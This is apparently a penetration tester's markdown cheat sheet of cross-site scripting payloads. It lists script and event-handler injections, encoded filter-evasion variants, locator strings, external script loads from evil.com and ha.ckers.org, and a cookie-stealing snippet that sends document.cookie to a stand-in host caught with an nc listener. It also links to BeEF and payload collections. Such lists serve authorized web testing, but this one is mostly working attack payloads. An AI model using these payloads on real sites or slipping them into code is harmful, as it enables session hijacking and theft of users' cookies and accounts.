# XSS (CROSS SITE SCRIPTING)

Quick Payloads
--------------
```
<script>alert("XSS")</script>
<script>alert('XSS')</script>
<script>alert(123123)</script>
<script>alert(document.cookie)</script>
<svg onload=alert(1)>
"/><object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==
"/><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
<body background="javascript:alert('running in background');">
<iframe src="javascript:alert('Hello');“/>
<input type=image src="&#74;avascript:alert('Have You')">
<img src='iamnothere.gif' onError=”alert('EventHandler')">
<img src=a onerror=alert(1)>
<frameset onLoad="alert('EventHandler')">
<layer name="extern" src="http://evil.com/test.html">
```

iframe: `<iframe src="http://www.cnn.com" height = "0" width = "0"></iframe>`  

Stealing cookies:  
```
<script>
new Image().src="http://0.0.0.0/bogus.php?output="+document.cookie;
</script>

You can see the browser's request by setting up nc listener on port 80.
```

* [OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

[Cheatsheet](http://ha.ckers.org/xss.html)
------------------------------------------

XSS locator:

```javacsript
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

XSS locator 2:

```
'';!--"<XSS>=&{()}
```

Other:

```
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

XSS and XML
-----------
```
<html:html xmlns:html='http://www.w3.org/1999/xhtml'>
  <html:script>
      alert(document.cookie);
  </html:script>
</html:html>
```

BeEf
----

* [Integrating Metasploit with BeEf](https://www.youtube.com/watch?v=kWvSV1u5sU8)

Misc
----

* [JSFuck](http://www.jsfuck.com/) - Javascript with six characters
* [XSS Payloads](http://www.xss-payloads.com/) - a variety of XSS payloads

Resources
---------

* [Cross-Site Scripting (XSS)](http://phpsecurity.readthedocs.io/en/latest/Cross-Site-Scripting-(XSS).html)
